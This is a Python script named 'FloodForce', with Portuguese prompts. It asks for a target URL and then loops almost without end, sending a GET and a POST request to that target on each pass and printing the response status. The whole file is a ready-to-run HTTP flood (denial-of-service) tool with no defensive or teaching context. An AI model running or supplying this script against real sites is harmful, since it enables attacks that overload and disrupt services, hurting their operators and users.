import requests
import os
import pyfiglet
from colorama import init, Fore, Style
import sys
import time
from urllib.parse import urlparse

class httpFlood:
    def atack(self):
        os.system("cls" if sys.platform == "win32" else "clear")
        try:
            def logo():
                lg = pyfiglet.figlet_format("FloodForce")
                print(Fore.YELLOW + f"{lg}" + Style.RESET_ALL)
            logo()

            try:
                url = input(Fore.CYAN + "Digite o ip/url (http ou https://url.com): ")
                
                if not url:
                    print(Fore.YELLOW + "url em branco!!")
                    time.sleep(1)
                    exit()
                elif url == "sair":
                    print(Fore.RED + "você saiu!")
                    time.sleep(1)
                    exit()
            except Exception as e:
                print(Fore.RED + "ERROR")

            def validar_url(url):
                try:
                    resultado = urlparse(url)
                    return all([resultado.scheme, resultado.netloc])
                except ValueError:
                    print(Fore.RED + "ERRO DE VALOR")
                    exit()

            if validar_url(url):
                print(Fore.GREEN + "url valida\n")
            else:
                print(Fore.YELLOW + "url invalida")
                time.sleep(1)
                exit()

            for i in range(1, 100000000000):
                get = requests.get(url)
                post = requests.post(url)
                print(Fore.GREEN + f"status do flood:", get.status_code, f"{i}" + Style.RESET_ALL)
                	
        except KeyboardInterrupt:
            print(Fore.RED + "saindo..." + Style.RESET_ALL)
            time.sleep(2)
            exit()
            
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"tipo do erro de requests: {e}" + Style.RESET_ALL)

HFD = httpFlood()
HFD.atack()
                    
